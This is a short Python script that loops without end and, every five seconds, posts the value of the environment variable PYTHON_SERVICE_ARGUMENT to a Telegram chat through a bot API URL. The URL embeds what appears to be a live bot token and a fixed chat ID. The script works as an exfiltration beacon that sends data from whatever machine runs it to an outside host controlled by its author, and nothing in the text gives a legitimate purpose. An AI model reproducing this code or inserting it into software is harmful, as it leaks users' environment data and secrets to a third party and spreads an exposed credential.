import time,requests,os

while True:
    requests.post("https://api.telegram.org/bot8498919917:AAEJrci5vCXGL2_uvpYHyFhv6qGEi1iohqI/sendMessage", data={'chat_id':'7589082187','text':os.environ.get('PYTHON_SERVICE_ARGUMENT','No argv Found')})
    time.sleep(5)